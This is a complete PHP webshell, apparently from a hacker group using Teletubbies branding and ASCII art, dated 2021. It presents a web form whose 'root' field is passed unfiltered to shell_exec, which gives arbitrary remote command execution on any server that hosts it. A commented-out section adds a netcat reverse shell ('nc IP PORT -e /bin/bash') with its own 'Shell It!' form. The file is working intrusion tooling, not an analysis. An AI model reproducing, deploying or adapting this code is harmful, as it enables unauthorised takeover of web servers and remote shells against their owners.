<?php
// TeletubbieBoys.ml - TeletubbieSquad.ml - HackThePlanet.cf - 2021
// gibs0n.php webshell
/*
            TUBBY TUSTARD! TUBBY TUSTARD! CTHULHU FHTAGN!
            ___              |\            .---.             _
           ( o )            |'_\           \ V /            | |
           _| |_           _| |_           _| |_           _| |_
         .`_____`.       .`_____`.       .`_____`.       .`_____`.
       |\ /     \ /|   |\ /     \ /|   |\ /     \ /|   |\ /     \ /|
       |||  @ @  |||   |||  9 9  |||   |||  6 6  |||   |||  o o  |||
       \_\   =   /_/   \_\   -   /_/   \_\   o   /_/   \_\  ._.  /_/
        .-'-----'-.     .-'-----'-.     .-'-----'-.     .-'-----'-.
       (_   ___   _)   (_   ___   _)   (_   ___   _)   (_   ___   _)
         | |___| |       | |___| |       | |___| |       | |___| |
         |       |       |       |       |       |       |       |
         (___|___)       (___|___)       (___|___)       (___|___)
*/
echo "<p><center>TUBBY TUSTARD! TUBBY TUSTARD! CTHULHU FHTAGN!</center></p>";
echo "<p><center>TeletubbieBoys.ml - TeletubbieSquad.ml - HackThePlanet.cf - 2021</center></p>";
echo "<p><center><hr></center></p>";
echo "<p><center>g0d - NTG - Spookz</center></p>";
echo "<br><br<br>";
if(isset($_POST['root']))
{
    $exe = $_POST['root'];
    $output = shell_exec($exe);
    echo "<pre>".$output."</pre>";
}
echo "<br><br>";
/*if(isset($_POST['ip_addr']) and isset($_POST['port']))
{
    $ip = $_POST['ip_addr'];
    $port = $_POST['port'];
    $output = shell_exec("nc ".$ip." ".$port." -e /bin/bash");
}
echo "<br><br>";*/
?>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <title>#TeletubbieBoys</title>
      <meta name="description" content="RIU Teletubbies">
      <meta name="author" content="g0d">
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
<form method="post">
<p>
<center>Command : <input type="text" name="root"/>
</p>
<input type="submit" value="Execute"/></center>
</form>

<!----<form method="post">
<p>
NC Reverse Shell<br>
IP: <input type="text" name="ip_addr"/><br>
Port: <input type="text" name="port"/>
</p>
<input type="submit" value="Shell It!"/>--->
